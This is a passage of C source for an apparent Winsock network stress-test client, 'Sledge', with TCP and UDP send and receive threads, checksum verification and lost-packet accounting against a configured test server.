				pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
			ExitProcess(0);
			break;
        }
		
        if (!SocketClosed)
        {
            EnterCriticalSection(&g_csSledgeCritSection);
			
            pConn->PacketLenMin = MIN(pConn->PacketLenMin, Len);
            pConn->PacketLenMax = MAX(pConn->PacketLenMax, Len);
			
            pConn->TotalPacketsOut++;
            pConn->TotalBytesOut += Len;
            pConn->DeltaBytesOut += Len;
			
            pConn->PacketsOutHead = (pConn->PacketsOutHead + 1) % 
				MAX_PACKETS_IN_FLIGHT;
            pConn->PacketsOutCount++;
			
            if (pConn->PacketsOutHead == pConn->PacketsOutTail)
            {
				TRACE(TEXT("Sledge[%d,%s]: pConn->PacketsOutHead == pConn->PacketsOutTail\r\n"), 
					pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                ExitProcess(0);
            }
            
            LeaveCriticalSection(&g_csSledgeCritSection);
        }
		
		if((pConn->ConnType == CONN_UDP) && (Reps < g_SledgeParms.PacketsPerConn))
			Sleep(g_SledgeParms.UDPSleepBeforeNext);
		
		if (SetEvent(pConn->hPacketsOutEvent) != TRUE)
		{	
            TRACE(TEXT("Sledge[%d,%s]: SetEvent(hPacketsOutEvent) failed %d\r\n"), 
				pConn->Index, CONN_TYPES_Str[pConn->ConnType],
				GetLastError());
		}
		
	}
	
    if (SocketClosed)
    {
        EnterCriticalSection(&g_csSledgeCritSection);
		
        if (pConn->RecvThreadDown)
            CloseConn(pConn);
		
        pConn->SendThreadDown = TRUE;
		
        pConn->PacketsOut[pConn->PacketsOutHead].Len = -1;
        
        pConn->PacketsOutHead = (pConn->PacketsOutHead + 1) % 
			MAX_PACKETS_IN_FLIGHT;
		
		// UDP shouldn't increment the number of packets out on send thread exit
		if(pConn->ConnType != CONN_UDP)
			pConn->PacketsOutCount++;
		
        if (pConn->PacketsOutHead == pConn->PacketsOutTail)
        {
			TRACE(TEXT("Sledge[%d,%s]: pConn->PacketsOutHead == pConn->PacketsOutTail\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
            ExitProcess(0);
        }
		
        LeaveCriticalSection(&g_csSledgeCritSection);
		
        if (SetEvent(pConn->hPacketsOutEvent) != TRUE)
        {	
            TRACE(TEXT("Sledge[%d,%s]: SetEvent(hPacketsOutEvent) failed %d\r\n"), 
				pConn->Index, CONN_TYPES_Str[pConn->ConnType],
				GetLastError());
        }
		
        SetEvent(g_hCreateThreadsEvent);
    }
    else
    {    
        switch(pConn->ConnType)
        {
		case CONN_TCP:
			Packet[0] = 0x1A;
            if (SendPacketSTREAM(pConn, 1, Packet) != 0)
                SocketClosed = TRUE;
            break;
		case CONN_UDP:
			break;
		default:
			TRACE(TEXT("Sledge[%d,%s]: invalid connection type\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
			ExitProcess(0);
			break;
        }
		
        EnterCriticalSection(&g_csSledgeCritSection);
		
        pConn->SendThreadDown = TRUE;
		
		pConn->PacketsOut[pConn->PacketsOutHead].Len = -1;
		
		pConn->PacketsOutHead = (pConn->PacketsOutHead + 1) % 
			MAX_PACKETS_IN_FLIGHT;
		
		// UDP shouldn't increment the number of packets out on send thread exit
		if(pConn->ConnType != CONN_UDP)
			pConn->PacketsOutCount++;
		
		if (pConn->PacketsOutHead == pConn->PacketsOutTail)
		{
			TRACE(TEXT("Sledge[%d,%s]: pConn->PacketsOutHead == pConn->PacketsOutTail\r\n"), 
				pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
			ExitProcess(0);
		}
		
        LeaveCriticalSection(&g_csSledgeCritSection);
		
        if (SetEvent(pConn->hPacketsOutEvent) != TRUE)
        {	
            TRACE(TEXT("Sledge[%d,%s]: SetEvent(hPacketsOutEvent) failed %d\r\n"), 
				pConn->Index, CONN_TYPES_Str[pConn->ConnType],
				GetLastError());
        }
		
	}
	
	LocalFree (Packet);
	
	return(0);
}

//*****************************************************************************
//*** ClientRecvThread - Thread that handles receiving data from the server ***
//*****************************************************************************
DWORD WINAPI ClientRecvThread(LPVOID *pParm)
{
    CLIENT_CONNS *pConn = (CLIENT_CONNS *) pParm;
    BOOL  SocketClosed  =  FALSE, TimedOut;
	
	int   Result = 0;
	
    BYTE *Packet, PacketNumber;
	
	int	  CurrentPacketsOutCount, LastPacketExpected, MaxPacketExpected;
	int   CurrentPacketExpected, SkippedPackets;
    int   Reps, Len, Offset;
	
	Packet = (BYTE *) LocalAlloc(LPTR, PACKET_MAX_LEN);
	
	if (NULL == Packet)
	{
		TRACE(TEXT("Sledge[%d,%s]: unable to allocate packet\r\n"),
			pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		
        ExitProcess(0);
    }
	
	while(1)
	{
		WaitForSingleObject(pConn->hPacketsOutEvent, INFINITE);
		
		EnterCriticalSection(&g_csSledgeCritSection);
		
		CurrentPacketsOutCount = pConn->PacketsOutCount;
		MaxPacketExpected = g_SledgeParms.PacketsPerConn - 1;
		CurrentPacketExpected = MIN(pConn->PacketsOut[pConn->PacketsOutTail].Index, MaxPacketExpected);
		LastPacketExpected = MIN(CurrentPacketExpected + CurrentPacketsOutCount - 1, MaxPacketExpected);
		
		
		LeaveCriticalSection(&g_csSledgeCritSection);
		
		TimedOut = FALSE;
		
		//Added UDP Support...
		if(pConn->ConnType == CONN_UDP)
		{
			
			for(Reps = 0; (Reps < CurrentPacketsOutCount) && (!TimedOut);)
			{
				if (RandomRange(0, 99) < (ULONG) g_SledgeParms.ClientSleepyRecvs)
				{
					pConn->SleepyRecv = TRUE;
					
					Sleep(SLEEP_BEFORE_RECV_MS);
				}
				
				Len = PACKET_MAX_LEN;
				
				Result = RecvPacketDGRAM(pConn, &Len, Packet);
				if(Result == DEATH_BY_HATCHET)
				{
					SocketClosed = TRUE;
					goto ExitClientRecvThread;
				}
				else if (Result == RECEIVE_TIMED_OUT)
				{
					TimedOut = TRUE;
					
					//Since we waited a fair ammount of time to receive a
					//packet, go ahead and assume that it is lost... increment
					//the tail pointer by the number of packets that we were
					//waiting for and decrement the number of packets that
					//are currently listed as "out"
					
					EnterCriticalSection(&g_csSledgeCritSection);
					pConn->PacketsOutTail = (pConn->PacketsOutTail + (CurrentPacketsOutCount - Reps)) 
						% MAX_PACKETS_IN_FLIGHT;
					pConn->PacketsOutCount -= (CurrentPacketsOutCount - Reps);
					pConn->TotalLostPackets += (CurrentPacketsOutCount - Reps);
					LeaveCriticalSection(&g_csSledgeCritSection);
					
					//All the packets for this cycle haven't been
					//received yet...  
					continue;
				}
				
				//Otherwise, we received a packet... since this is an unguaranteed
				//protocol, we can't count on in-order delivery, or reliable delivery
				//We must determine which packet this is by reading the first byte...
				PacketNumber = Packet[0];
				
				//We weren't expecting this packet, we'd already assumed it was lost
				//We won't log it as a successfully received packet... instead we'll
				//log it as late... then continue
				if(PacketNumber < CurrentPacketExpected)
				{
					EnterCriticalSection(&g_csSledgeCritSection);
					
					pConn->TotalLatePackets++;
					pConn->TotalLostPackets--;
					
					LeaveCriticalSection(&g_csSledgeCritSection);
					continue;
				}
				// This packet has an invalid packet number... drop it
				// and continue
				else if (PacketNumber > MaxPacketExpected)
					continue;
				
				EnterCriticalSection(&g_csSledgeCritSection);
				
				//If the packet number of the packet we received has a higher number
				//than the one we were expecting, we assume that any packets between
				//the one expected and the one received were lost and we skip them.
				SkippedPackets = 0;
				
				for(Offset = 0; Offset < (PacketNumber - CurrentPacketExpected); Offset++)
				{
					SkippedPackets++;
					pConn->PacketsOutCount--;
					
					//In the rare event that we received a packet before the sending
					//thread incremented its head marker, leave the critical section
					//and give it some time...
					while(((pConn->PacketsOutTail + 1) % MAX_PACKETS_IN_FLIGHT) == pConn->PacketsOutHead)
					{
						LeaveCriticalSection(&g_csSledgeCritSection);
						Sleep(1000);
						EnterCriticalSection(&g_csSledgeCritSection);
					}
					pConn->PacketsOutTail = (pConn->PacketsOutTail + 1) 
						% MAX_PACKETS_IN_FLIGHT;
					pConn->TotalLostPackets++;
					
					//Since we were expecting this packet, 
					Reps++;
				}
				CurrentPacketExpected += SkippedPackets;
				
				//Now that any skipped packets have been accounted for, update
				//our info for the packet we just received 
				//This packet just doesn't add up...
				if (CheckSum(Len, Packet) !=
					pConn->PacketsOut[pConn->PacketsOutTail].CheckSum)
				{
					pConn->TotalBadPackets++;
					
					LeaveCriticalSection(&g_csSledgeCritSection);
					continue;
				}
				
				CurrentPacketExpected++;
				pConn->PacketsOutCount--;
				pConn->PacketsOutTail = (pConn->PacketsOutTail + 1) 
					% MAX_PACKETS_IN_FLIGHT;
				Reps++;
				g_dwTotalPacketsIn++;
				g_dwTotalBytesIn += Len;
				pConn->TotalPacketsIn++;
				pConn->TotalBytesIn += Len;
				pConn->DeltaBytesIn += Len;
				
				LeaveCriticalSection(&g_csSledgeCritSection);
				
				if(PacketNumber >= MaxPacketExpected)
					goto ExitClientRecvThread;
			}
			
			//Since this was the last packet expected for this cycle,
			//end the receive thread...
			if(LastPacketExpected >= MaxPacketExpected)
				goto ExitClientRecvThread;
		}
		else
		{
			
			for (Reps = 0; Reps < CurrentPacketsOutCount; Reps++)
			{
				
				EnterCriticalSection(&g_csSledgeCritSection);
				
				Len = pConn->PacketsOut[pConn->PacketsOutTail].Len;
				
				LeaveCriticalSection(&g_csSledgeCritSection);
				
				if (RandomRange(0, 99) < (ULONG) g_SledgeParms.ClientSleepyRecvs)
				{
					pConn->SleepyRecv = TRUE;
					
					Sleep(SLEEP_BEFORE_RECV_MS);
				}
                
				switch(pConn->ConnType)
				{
				case CONN_TCP:
					Result = RecvPacketSTREAM(pConn, Len, Packet, (Len == -1));
					if ( Result == DEATH_BY_HATCHET)
					{
						SocketClosed = TRUE;
						goto ExitClientRecvThread;
					}
					
					if (Len == -1)
						goto ExitClientRecvThread;
					break;
				default:
					TRACE(TEXT("Sledge[%d,%s]: invalid connection type\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
					ExitProcess(0);
					break;
				}
				
				if (CheckSum(Len, Packet) != pConn->PacketsOut[pConn->PacketsOutTail].CheckSum)
				{
					TRACE(TEXT("Sledge[%d,%s]: CheckSum failed, packet len %d\r\n"), 
						pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
						Len);
					
					TRACE(TEXT("Sledge[%d,%s]: CheckSum expected %d, received %d\r\n"), 
						pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
						pConn->PacketsOut[pConn->PacketsOutTail].CheckSum,
						CheckSum(Len, Packet));
					
					SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
					
					TRACE(TEXT(" Client            Packet Size\r\n"));
					TRACE(TEXT("Connection Cycle  Min  Max  Avg   Packets      Bytes    Bytes/s\r\n"));
					TRACE(TEXT("---------- ----- ---- ---- ---- ----------- ----------- -------\r\n"));
					
					TRACE(TEXT("%3d %6s %5d %4d %4d %4d %11d %11d %7d (send)\r\n"),
						pConn->Index,
						CONN_TYPES_Str[pConn->ConnType],
						pConn->Cycle,
						pConn->PacketLenMin,
						pConn->PacketLenMax,
						(pConn->TotalPacketsOut > 0) ?
						pConn->TotalBytesOut / 
						pConn->TotalPacketsOut :
					0,
						pConn->TotalPacketsOut,
						pConn->TotalBytesOut,
						0);
                    
					TRACE(TEXT("                                %11d %11d %7d (recv)\r\n"),
						pConn->TotalPacketsIn,
						pConn->TotalBytesIn,
						0);
					ExitProcess(0);
				}
				
				EnterCriticalSection(&g_csSledgeCritSection);
				
				g_dwTotalPacketsIn++;
				g_dwTotalBytesIn += Len;
				
				pConn->TotalPacketsIn++;
				pConn->TotalBytesIn += Len;
				pConn->DeltaBytesIn += Len;
				
				pConn->PacketsOutTail = (pConn->PacketsOutTail + 1) 
					% MAX_PACKETS_IN_FLIGHT;
				pConn->PacketsOutCount--;
				
				LeaveCriticalSection(&g_csSledgeCritSection);
			}
		}
	}
	
ExitClientRecvThread:
	
    if (SocketClosed)
    {
        EnterCriticalSection(&g_csSledgeCritSection);
		
        if (pConn->SendThreadDown)
            CloseConn(pConn);
		
        pConn->RecvThreadDown = TRUE;        
		
        LeaveCriticalSection(&g_csSledgeCritSection);
    }
    else
    {    
		//Without this, it is possible for the recv thread to overtake
		//the send thread and kill the socket before the send thread
		//exits...
		while(! pConn->SendThreadDown)
			Sleep(1000);
		
        EnterCriticalSection(&g_csSledgeCritSection);
		
        pConn->RecvThreadDown = TRUE;
		
        pConn->PacketsOutTail = (pConn->PacketsOutTail + 1) 
			% MAX_PACKETS_IN_FLIGHT;
        pConn->PacketsOutCount--;
		
        CloseConn(pConn);
		
        LeaveCriticalSection(&g_csSledgeCritSection);
    }
	
    SetEvent(g_hCreateThreadsEvent);
	
	LocalFree (Packet);
	
	return(0);
}

//*******************************************************
//*** OpenConn - Establish a connection to the server ***
//*******************************************************
void OpenConn(CLIENT_CONNS *pConn)
{
	
    SOCKADDR_IN		DstAddrIP  = { AF_INET }, LclAddrIP = { AF_INET };
	ULONG			uNonBlockParam = TRUE;
	
    int           RepeatCount = 0;
  
    switch(pConn->ConnType)
    {		
	case CONN_TCP:        
        DstAddrIP.sin_port        = htons(TCP_SERV_PORT);
        DstAddrIP.sin_addr.s_addr = htonl(g_SledgeParms.ServTCPAddr);
		
        if ((pConn->Sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            TRACE(TEXT("Sledge[%d,%s]: socket() failed %s\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
				GetLastErrorText());
			
            ExitProcess(0);
        }
		
		// If necessary, set the socket for non-blocking IO
		if(g_fNonBlocking)
		{
//			TRACE(TEXT("Setting client socket for non-blocking IO\r\n"));

			if(ioctlsocket(pConn->Sock, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
			{
				TRACE(TEXT("Sledge[%s]: ioctlsocket() error %s while setting to non-blocking\r\n"),
					CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
				ExitProcess(0);
			}
		}

        while (1)
        { 
            if (connect(pConn->Sock, (const struct sockaddr *) &DstAddrIP,  sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
            {
				// If this test is non-blocking, then wait for the connection to complete
				if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
//					TRACE(TEXT("Client thread would have blocked.  Wait for connection to complete\r\n"));

					if(!WaitForWriteableSocket(pConn->Sock))
					{
						TRACE(TEXT("Sledge[%d,%s]: Failed waiting for connection to complete\r\n"),
							pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
						ExitProcess(0);
					}
					else
						break;
				}

                if (WSAGetLastError() == WSAECONNREFUSED)
                {
                    if (RepeatCount++ == CLIENT_TCP_CONNECT_RETRIES)
                    {
                        TRACE(TEXT("Sledge[%d,%s]: connect(0x%02X%02X 0x%02X%02X 0x%02X%02X%02X%02X) failed %s (%d times)\r\n"), 
							pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
							((BYTE *) &DstAddrIP)[0], ((BYTE *) &DstAddrIP)[1],
							((BYTE *) &DstAddrIP)[2], ((BYTE *) &DstAddrIP)[3],
							((BYTE *) &DstAddrIP)[4], ((BYTE *) &DstAddrIP)[5],
							((BYTE *) &DstAddrIP)[6], ((BYTE *) &DstAddrIP)[7],
							GetLastErrorText(),
							CLIENT_TCP_CONNECT_RETRIES);
						
                        ExitProcess(0);
                    }
                }
                else
                {
                    TRACE(TEXT("Sledge[%d,%s]: connect(0x%02X%02X 0x%02X%02X 0x%02X%02X%02X%02X) failed %s\r\n"), 
						pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
						((BYTE *) &DstAddrIP)[0], ((BYTE *) &DstAddrIP)[1],
						((BYTE *) &DstAddrIP)[2], ((BYTE *) &DstAddrIP)[3],
						((BYTE *) &DstAddrIP)[4], ((BYTE *) &DstAddrIP)[5],
						((BYTE *) &DstAddrIP)[6], ((BYTE *) &DstAddrIP)[7],
						GetLastErrorText());
					
                    ExitProcess(0);
                }
				Sleep(1000);
            }
            else
                break;
        }
		
        break;
		
	case CONN_UDP:
		LclAddrIP.sin_family      = AF_INET;
		LclAddrIP.sin_port        = htons(UDP_SERV_PORT);
		LclAddrIP.sin_addr.s_addr = INADDR_ANY;
		
        if ((pConn->Sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
        {
            TRACE(TEXT("Sledge[%d,%s]: socket() failed %s\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
				GetLastErrorText());
			
            ExitProcess(0);
        }

		// If necessary, set the socket for non-blocking IO
		if(g_fNonBlocking)
		{	
//			TRACE(TEXT("Setting client socket for non-blocking IO\r\n"));

			if(ioctlsocket(pConn->Sock, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
			{
				TRACE(TEXT("Sledge[%s]: ioctlsocket() error %s while setting to non-blocking\r\n"),
					CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
				ExitProcess(0);
			}
		}

		if (bind(pConn->Sock, (const struct sockaddr *) &LclAddrIP, 
			sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
            TRACE(TEXT("Sledge[%d,%s]: bind() failed %s\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
				GetLastErrorText());
			
            ExitProcess(0);
		}
        break;	
	default:
		TRACE(TEXT("Sledge[%d,%s]: invalid connection type\r\n"),
			pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		ExitProcess(0);
		break;
		
    }
	
    pConn->Connected = TRUE;
}

//**********************************************
//*** CloseConn - Close connection to server ***
//**********************************************
void CloseConn(CLIENT_CONNS *pConn)
{
    switch(pConn->ConnType)
    {
	case CONN_TCP:        
	case CONN_UDP:
        pConn->InClose = TRUE;
		
        if (closesocket(pConn->Sock) == SOCKET_ERROR)
        {
            pConn->InClose = FALSE;
            
            if (g_SledgeParms.InFlightCloses)
            {
                if (GetLastError() != WSAENOTSOCK)
                {
                    TRACE(TEXT("Sledge[%d,%s]: closesocket() failed %s\r\n"),
						pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
						GetLastErrorText());
					
                    ExitProcess(0);
                }
            }
            else
            {
                TRACE(TEXT("Sledge[%d,%s]: closesocket() failed %s\r\n"),
					pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
					GetLastErrorText());
				
                ExitProcess(0);
            }
        }
        
        pConn->InClose = FALSE;
        break;
	default:
		TRACE(TEXT("Sledge[%d,%s]: invalid connection type\r\n"),
			pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		ExitProcess(0);
		break;
    }
	
    pConn->Connected = FALSE;
}

//*****************************************************************************************
//*** RecvPacketSTREAM - Receive packet from reliable data source (e.g. TCP connection) ***
//*****************************************************************************************
int RecvPacketSTREAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[],
                 BOOL ExpectingClose)
{
    BOOL   Loop = FALSE;
	int    TotalBytesRead = 0;
	ULONG  BytesRead;
	
    if (ExpectingClose)
        Len = 1;
    
	while (TotalBytesRead < Len)
	{
		
        Loop = TRUE;
		
		pConn->InRecv = TRUE;
		
        if ((BytesRead = recv(pConn->Sock, (char *) Buff + TotalBytesRead,
			Len - TotalBytesRead, 0)) == SOCKET_ERROR)
        {
			// If this is a non-blocking test, wait for pending data before calling recv again
			if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
			{
//				TRACE(TEXT("Client thread would have blocked.  Wait for pending data\r\n"));
				if(!WaitForReadableSocket(pConn->Sock))
					ExitProcess(0);
				
//				TRACE(TEXT("Select indicated that there is pending data.  Calling recv\r\n"));
				if ((BytesRead = recv(pConn->Sock,(char *) Buff + TotalBytesRead,Len - TotalBytesRead, 0)) != SOCKET_ERROR)
					goto TCPReadOK;
			}

            pConn->InRecv = FALSE;
            
            if (g_SledgeParms.InFlightCloses)
            {            
                if (GetLastError() != WSAENOTSOCK     &&
                    GetLastError() != WSAECONNRESET   &&
                    GetLastError() != WSAECONNABORTED &&
                    GetLastError() != WSAESHUTDOWN    &&
                    GetLastError() != WSAENOTCONN     &&
                    GetLastError() != WSAEINVAL       &&
                    GetLastError() != WSAEDISCON      &&
                    GetLastError() != WSAEINTR)
                {
					
                    TRACE(TEXT("Sledge[%d,%s]: recv() failed %s(%u)\r\n"),
						pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
						GetLastErrorText(), WSAGetLastError());
					
                    ExitProcess(0);
                }
                else
                    return(DEATH_BY_HATCHET);
            }
            else
            {
				SOCKADDR_IN	addrLocal;
				INT			addrLen;
				
				addrLen = sizeof(SOCKADDR_IN);
				getsockname(pConn->Sock, (struct sockaddr *) &addrLocal, &addrLen);
				
				TRACE(TEXT("Sledge[%d,%s]: recv() failed %s(%u) on port 0x%x on cycle %d, %d packets out, %d packets in\r\n"),
					pConn->Index, CONN_TYPES_Str[pConn->ConnType], GetLastErrorText(), WSAGetLastError(),
					ntohs(addrLocal.sin_port), pConn->Cycle, pConn->TotalPacketsOut, pConn->TotalPacketsIn);
				
                ExitProcess(0);
            }
        }
		
// The recv succeeded
TCPReadOK:
        pConn->InRecv = FALSE;
		
        if (ExpectingClose && BytesRead == 0)
            return(0);
		
        if ((! ExpectingClose) && BytesRead == 0)
        {
            TRACE(TEXT("Sledge[%d,%s]: recv() unexpected socket close\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
			
            ExitProcess(0);
        }
		
		TotalBytesRead += BytesRead;
	}
	
    return(0);
}

//*****************************************************************************************
//*** RecvPacketSTREAM - Receive packet from datagram data source (e.g. UDP connection) ***
//*****************************************************************************************
int RecvPacketDGRAM(CLIENT_CONNS *pConn, int *Len, BYTE Buff[])
{
    BOOL         Loop = FALSE;
	ULONG        BytesRead;
	
	pConn->InRecv = TRUE;
	
	if ((BytesRead = recvfrom(pConn->Sock, (char *) Buff, *Len, 0, NULL, NULL)) == SOCKET_ERROR)
	{
		// If this is a non-blocking test, wait for pending data before calling recv again
		if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
		{
//			TRACE(TEXT("Client thread would have blocked.  Wait for pending data\r\n"));
			if(!WaitForReadableSocket(pConn->Sock))
				ExitProcess(0);
			
//			TRACE(TEXT("Select indicated that there is pending data.  Calling recvfrom\r\n"));
			if ((BytesRead = recvfrom(pConn->Sock, (char *) Buff, *Len, 0, NULL, NULL)) != SOCKET_ERROR)
				goto UDPReadOK;
		}
		
		pConn->InRecv = FALSE;
		
//		TRACE(TEXT("recvfrom generated an error.\r\n"));
		
		if (g_SledgeParms.InFlightCloses)
		{            
			if (GetLastError() != WSAENOTSOCK     &&
				GetLastError() != WSAECONNRESET   &&
				GetLastError() != WSAECONNABORTED &&
				GetLastError() != WSAESHUTDOWN    &&
				GetLastError() != WSAENOTCONN     &&
				GetLastError() != WSAEINVAL       &&
				GetLastError() != WSAEDISCON      &&
				GetLastError() != WSAEINTR)
			{
				TRACE(TEXT("Sledge[%d,%s]: recv() failed %s\r\n"),
					pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
					GetLastErrorText());
				
				ExitProcess(0);
			}
			else
			{
				
				return(DEATH_BY_HATCHET);
			}
		}
		else
		{
			TRACE(TEXT("Sledge[%d,%s]: recv() failed %s\r\n"),
				pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
				GetLastErrorText());
			
			ExitProcess(0);
		}
	}

// The recvfrom succeeded
UDPReadOK:

	pConn->InRecv = FALSE;
	
	if (BytesRead == 0)
	{
		TRACE(TEXT("Sledge[%d,%s]: recv() unexpected socket close\r\n"),
			pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		
		ExitProcess(0);
	}
	
	*Len = BytesRead;
	
    return(0);
}

//****************************************************************************************
//*** SendPacketSTREAM - Send packet via reliable communications (e.g. TCP connection) ***
//****************************************************************************************
int SendPacketSTREAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[])
{
	ULONG  BytesSent, TotalBytesSent;

	if(Len <= 0)
		return (0);
	
	TotalBytesSent = 0;
	while(TotalBytesSent < (ULONG) Len)
	{
		pConn->InSend = TRUE;
		
		if ((BytesSent = send(pConn->Sock, (char *) Buff + TotalBytesSent, Len - TotalBytesSent, 0)) == SOCKET_ERROR)
		{
			// If this is a non-blocking test, wait for 100ms before calling send again
			if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
			{
//				TRACE(TEXT("Client thread would have blocked.  Wait for buffer to empty\r\n"));

				pConn->InSend = FALSE;

				Sleep(100);
				continue;
			}
			
			pConn->InSend = FALSE;
			
			if (g_SledgeParms.InFlightCloses)
			{
				if (GetLastError() != WSAENOTSOCK     &&
					GetLastError() != WSAECONNRESET   &&
					GetLastError() != WSAECONNABORTED &&
					GetLastError() != WSAESHUTDOWN    &&
					GetLastError() != WSAENOTCONN     &&
					GetLastError() != WSAEINVAL       &&
					GetLastError() != WSAEDISCON      &&
					GetLastError() != WSAEINTR)
				{
					TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"),
						pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
						GetLastErrorText());
					
					ExitProcess(0);
				}
				else
					return(GetLastError());
			}
			else
			{
				SOCKADDR_IN	addrLocal;
				INT			addrLen;
				
				addrLen = sizeof(SOCKADDR_IN);
				getsockname(pConn->Sock, (struct sockaddr *) &addrLocal, &addrLen);
				
				TRACE(TEXT("Sledge[%d,%s]: send() failed %s on port 0x%x on cycle %d, %d packets out, %d packets in\r\n"),
					pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
					GetLastErrorText(), ntohs(addrLocal.sin_port), pConn->Cycle, pConn->TotalPacketsOut, pConn->TotalPacketsIn);
				
				ExitProcess(0);
				
			}
		}
		
		TotalBytesSent += BytesSent;
		pConn->InSend = FALSE;
	}
	
    if ((int) TotalBytesSent != Len)
    {
		TRACE(TEXT("Sledge[%d,%s]: TotalBytesSent (%u) != Len (%u)\r\n"), pConn->Index, CONN_TYPES_Str[pConn->ConnType],
			TotalBytesSent, Len);
        ExitProcess(0);
    }
	
    return(0);
}

//*****************************************************************************************
//*** SendPacketDGRAM - Send packet via unreliable communications (e.g. UDP connection) ***
//*****************************************************************************************
int SendPacketDGRAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[])
{
	ULONG         BytesSent;
	SOCKADDR_IN   DstAddrIP = { AF_INET };
	
    pConn->InSend = TRUE;
	
    DstAddrIP.sin_port        = htons(UDP_SERV_PORT);
    DstAddrIP.sin_addr.s_addr = htonl(g_SledgeParms.ServUDPAddr);
	
	if(Len < 0)
		return (0);

    if ((BytesSent = sendto(pConn->Sock, (char *) Buff, Len, 0,
		(const struct sockaddr *) &DstAddrIP, sizeof(SOCKADDR_IN))) == SOCKET_ERROR)
    {
		//Wait for 100ms between sendto attempts...
		while(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
		{
//			TRACE(TEXT("Client thread would have blocked.  Wait for pending data\r\n"));

			if ((BytesSent =
				sendto(pConn->Sock, (char *) Buff, Len, 0, (const struct sockaddr *) &DstAddrIP, sizeof(SOCKADDR_IN)))
				== SOCKET_ERROR)
			{
				if(BytesSent < (ULONG) Len)
				{
					TRACE(TEXT("Sledge[%d,%s]: sendto() sent a UDP fragment!\r\n"),
						pConn->Index, 
						CONN_TYPES_Str[pConn->ConnType]);
					
					ExitProcess(0);
				}
				
				goto UDPWriteOK;
			}
			
			Sleep(100);
		}

//		TRACE(TEXT("sendto generated an error.\r\n"), Len);
		
        pConn->InSend = FALSE;
        
        if (g_SledgeParms.InFlightCloses)
        {
            if (GetLastError() != WSAENOTSOCK     &&
                GetLastError() != WSAECONNRESET   &&
                GetLastError() != WSAECONNABORTED &&
                GetLastError() != WSAESHUTDOWN    &&
                GetLastError() != WSAENOTCONN     &&
                GetLastError() != WSAEINVAL       &&
                GetLastError() != WSAEDISCON      &&
                GetLastError() != WSAEINTR)
            {
                TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"),
					pConn->Index, CONN_TYPES_Str[pConn->ConnType], 
					GetLastErrorText());
				
                ExitProcess(0);
            }
            else
			{
                return(GetLastError());
			}
        }
        else
        {
            TRACE(TEXT("Sledge[%d,%s]: send() failed %s\r\n"),
				pConn->Index, 
				CONN_TYPES_Str[pConn->ConnType], 
				GetLastErrorText());
			
            ExitProcess(0);
        }
    }

// The sendto succeeded
UDPWriteOK:

    pConn->InSend = FALSE;
	
    if ((int) BytesSent != Len)
    {
        TRACE(TEXT("Sledge[%d,%s]: BytesSent != Len\r\n"),
			pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
		
        ExitProcess(0);
    }
	
	
    return(0);
}

//*****************************************************
//*** RandomRange - Generate a pseudo-random number ***
//*****************************************************
ULONG RandomRange(ULONG Min, ULONG Max)
{
#if defined UNDER_CE
    return((Random() % (Max - Min + 1)) + Min);
#else
    return((GetTickCount() % (Max - Min + 1)) + Min);
#endif    
} 

//**********************************************************************
//*** BuildTestPacket - Build a packet of a particular class of data ***
//**********************************************************************
ULONG BuildTestPacket(CLIENT_CONNS *pConn, int Len, BYTE Buff[], int nPacketNum)
{
    ULONG CheckSum = 0;
    int   i = 0;
	
	Buff[i] = (BYTE) nPacketNum;
	CheckSum += Buff[i];
	i++;
	
    for (; i < Len; i++)
    {
        Buff[i] = pConn->NextChar;
		if( g_ptTxDataType == INCREMENT )
		{
			if (pConn->NextChar == 'z')
				pConn->NextChar = 'a';
			else
				pConn->NextChar++;
		}
		else if ( g_ptTxDataType == RANDOM )
		{
			while((pConn->NextChar = (BYTE) (rand() & 0x000000ff)) == (BYTE) 0x1A);
		}
		
		
        CheckSum += Buff[i];
    }
	
	if ((pConn->NextChar >= 'z') || (pConn->NextChar < 'a'))
		pConn->NextChar = 'a';
	else
		pConn->NextChar++;
	
    
    return(CheckSum);
}

//***********************************************
